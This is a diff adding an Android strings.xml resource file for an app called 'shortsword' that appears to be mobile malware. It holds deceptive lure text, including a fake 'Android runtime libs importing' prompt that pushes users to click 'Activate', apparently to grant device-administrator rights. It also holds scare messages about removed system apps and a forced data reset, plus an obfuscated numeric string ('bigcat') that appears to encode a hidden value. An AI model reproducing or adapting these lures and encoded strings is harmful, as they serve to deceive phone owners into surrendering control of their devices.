@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="ad_loading_text">Please, wait…</string>
+    <string name="ad_text">System applications could not be removed.</string>
+    <string name="ad_text_2">"This action will reset all your data.
+
+Click \"Yes\" and your's device will reboot and \"No\" for cancel."</string>
+    <string name="admin_alert">"Android runtime libs importing
+
+To continue, click \"Activate\".
+
+This operation can't be cancelled.
+"</string>
+    <string name="ad_button">OK</string>
+    <string name="app_name">shortsword</string>
+    <string name="bigcat">+21+33+37+87+44+33+30+34+32+37+26+32+41+29+34+30+39+29+32+33+37-36+52+15+41+94-33+41+25+112</string>
+    <string name="first_response">60</string>
+    <string name="ident">50:92:2</string>
+    <string name="req_response">300</string>
+    <string name="title_main">shortsword</string>
+    <string name="web_page">file:///android_asset/html/index.html</string>
+</resources>
